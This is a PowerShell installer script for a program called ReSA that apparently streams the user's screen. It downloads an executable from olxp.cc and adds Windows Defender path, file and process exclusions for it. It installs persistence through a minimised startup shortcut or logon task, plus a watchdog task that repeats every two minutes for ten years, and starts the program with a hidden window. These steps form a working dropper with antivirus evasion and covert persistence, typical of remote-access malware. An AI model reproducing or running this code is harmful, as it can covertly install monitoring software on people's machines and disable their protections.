# ReSA remote install - ASCII only for PowerShell 5.1 compatibility
param(
    [switch]$Silent
)

$ErrorActionPreference = "Continue"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue
}
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")
if ($BaseUrl -match "\s") {
    $BaseUrl = ($BaseUrl -split "\s+")[0]
}
if ($BaseUrl -match "^http://" -and $BaseUrl -notmatch "localhost|127\.0\.0\.1") {
    $BaseUrl = $BaseUrl -replace "^http://", "https://"
}

$Dir = Join-Path $env:LOCALAPPDATA "ReSA"
$Exe = Join-Path $Dir "ReSA.exe"
$Temp = Join-Path $env:TEMP "ReSA-download.exe"
$LogFile = Join-Path $env:TEMP "ReSA-install.log"
$script:HadError = $false

function Write-InstallLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Fail-Install {
    param([string]$Text)
    $script:HadError = $true
    Write-InstallLog $Text
    if (-not $Silent) {
        Write-Host $Text -ForegroundColor Red
    }
}

function Show-InstallPopup {
    param([string]$Text)
    try {
        $ws = New-Object -ComObject WScript.Shell
        $null = $ws.Popup($Text, 0, "ReSA Install", 48)
    } catch {
        $null = $_
    }
}

function Write-DefaultSettings {
    param([string]$SettingsPath)
    $json = @'
{
  "streamWidth": 1024,
  "fps": 8,
  "quality": 45
}
'@.Trim()
    try {
        [IO.File]::WriteAllText($SettingsPath, $json, (New-Object System.Text.UTF8Encoding $false))
        Write-InstallLog ("settings ok: " + $SettingsPath)
    } catch {
        Write-InstallLog ("settings skipped: " + $_.Exception.Message)
    }
}

function Stop-ReSAProcesses {
    for ($i = 0; $i -lt 3; $i++) {
        $procs = Get-Process -Name "ReSA" -ErrorAction SilentlyContinue
        if (-not $procs) {
            return
        }
        $procs | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 800
    }
}

function Disable-WatchdogTask {
    try {
        Disable-ScheduledTask -TaskName "ReSA-Watchdog" -ErrorAction SilentlyContinue | Out-Null
        Write-InstallLog "watchdog paused"
    } catch {
        Write-InstallLog ("watchdog pause skipped: " + $_.Exception.Message)
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        $null = $_
    }

    $curl = Join-Path $env:SystemRoot "System32\curl.exe"
    if (Test-Path -LiteralPath $curl) {
        & $curl -fsSL --retry 3 --retry-delay 2 --connect-timeout 30 --max-time 900 -o $OutFile $Url
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
            return
        }
        Write-InstallLog ("curl failed: exit " + $LASTEXITCODE + " url " + $Url)
    }

    $iwrArgs = @{
        Uri = $Url
        OutFile = $OutFile
        UseBasicParsing = $true
    }
    if ($PSVersionTable.PSVersion.Major -lt 6) {
        $iwrArgs.UserAgent = "ReSA-Installer/1.0"
    }
    Invoke-WebRequest @iwrArgs
}

function Add-DefenderExclusion {
    param(
        [string]$Path,
        [string]$ExePath
    )

    $ok = $false
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-InstallLog ("defender path exclusion ok: " + $Path)
        $ok = $true
    } catch {
        Write-InstallLog ("defender path exclusion skipped: " + $_.Exception.Message)
    }

    try {
        Add-MpPreference -ExclusionProcess "ReSA.exe" -ErrorAction Stop
        Write-InstallLog "defender process exclusion ok: ReSA.exe"
        $ok = $true
    } catch {
        Write-InstallLog ("defender process exclusion skipped: " + $_.Exception.Message)
    }

    if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
        try {
            Add-MpPreference -ExclusionPath $ExePath -ErrorAction Stop
            Write-InstallLog ("defender file exclusion ok: " + $ExePath)
            $ok = $true
        } catch {
            Write-InstallLog ("defender file exclusion skipped: " + $_.Exception.Message)
        }
    }

    return $ok
}

function Register-WatchdogTask {
    param(
        [string]$TaskName,
        [string]$Exe,
        [string]$Dir
    )

    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.ps1") -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.vbs") -Force -ErrorAction SilentlyContinue

    $Action = New-ScheduledTaskAction -Execute $Exe -Argument "-watchdog" -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
}

function Remove-ReSAStartupTask {
    try {
        Unregister-ScheduledTask -TaskName "ReSA" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    } catch {
        $null = $_
    }
}

function Remove-ReSAStartupShortcut {
    try {
        $lnk = Join-Path ([Environment]::GetFolderPath("Startup")) "ReSA.lnk"
        if (Test-Path -LiteralPath $lnk) {
            Remove-Item -LiteralPath $lnk -Force -ErrorAction SilentlyContinue
        }
    } catch {
        $null = $_
    }
}

Write-InstallLog "install start"
Write-InstallLog ("target: " + $Exe)

try {
    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
} catch {
    $null = $_
}

Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

Disable-WatchdogTask
Stop-ReSAProcesses
Start-Sleep -Milliseconds 500

function Remove-PyiExtractDirs {
    param([string]$ParentDir)
    if (-not $ParentDir -or -not (Test-Path -LiteralPath $ParentDir)) {
        return
    }
    Get-ChildItem -LiteralPath $ParentDir -Directory -Filter "_MEI*" -ErrorAction SilentlyContinue |
        ForEach-Object {
            Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
        }
}

Remove-PyiExtractDirs -ParentDir $Dir
Remove-PyiExtractDirs -ParentDir $env:TEMP

$Url = $BaseUrl + "/ReSA.exe"
Write-InstallLog ("download: " + $Url)
if (-not $Silent) {
    Write-Host "Downloading ReSA.exe (~55MB), please wait 1-3 minutes..."
}

if (Test-Path -LiteralPath $Temp) {
    Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
}

try {
    Download-File -Url $Url -OutFile $Temp
} catch {
    Fail-Install ("download failed: " + $_.Exception.Message)
    exit 1
}

if (-not (Test-Path -LiteralPath $Temp)) {
    Fail-Install "missing file after download"
    exit 1
}

$length = (Get-Item -LiteralPath $Temp).Length
if ($length -lt 1048576) {
    Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
    Fail-Install ("file too small: " + $length + " bytes")
    exit 1
}

if (Test-Path -LiteralPath $Exe) {
    Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
}

$moved = $false
for ($try = 0; $try -lt 5; $try++) {
    Stop-ReSAProcesses
    try {
        Move-Item -LiteralPath $Temp -Destination $Exe -Force
        $moved = $true
        break
    } catch {
        Write-InstallLog ("copy retry " + ($try + 1) + ": " + $_.Exception.Message)
        Start-Sleep -Seconds 1
    }
}
if (-not $moved) {
    Fail-Install ("copy failed after retries: " + $Exe)
    if ($Silent) {
        Show-InstallPopup ("ReSA install failed.`nSee log:`n" + $LogFile)
    }
    exit 1
}

Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue

Write-DefaultSettings -SettingsPath (Join-Path $Dir "settings.json")

Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

$startupOk = $false
try {
    $Startup = [Environment]::GetFolderPath("Startup")
    $Wsh = New-Object -ComObject WScript.Shell
    $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReSA.lnk"))
    $Link.TargetPath = $Exe
    $Link.WorkingDirectory = $Dir
    $Link.WindowStyle = 7
    $Link.Save()
    Remove-ReSAStartupTask
    $startupOk = $true
    Write-InstallLog "startup shortcut ok"
} catch {
    $null = $_
}

if (-not $startupOk) {
    Remove-ReSAStartupShortcut
    $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName "ReSA" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
    Write-InstallLog "scheduled task ok"
}

try {
    Register-WatchdogTask -TaskName "ReSA-Watchdog" -Exe $Exe -Dir $Dir
    Write-InstallLog "watchdog task ok"
} catch {
    Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
}

try {
    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    Write-InstallLog "started"
} catch {
    Fail-Install ("start failed: " + $_.Exception.Message)
    exit 1
}

Write-InstallLog "install complete"
if (-not $Silent) {
    Write-Host "ReSA install complete." -ForegroundColor Green
}
if ($script:HadError) {
    if ($Silent) {
        Show-InstallPopup ("ReSA install failed.`nSee log:`n" + $LogFile)
    }
    exit 1
}
exit 0
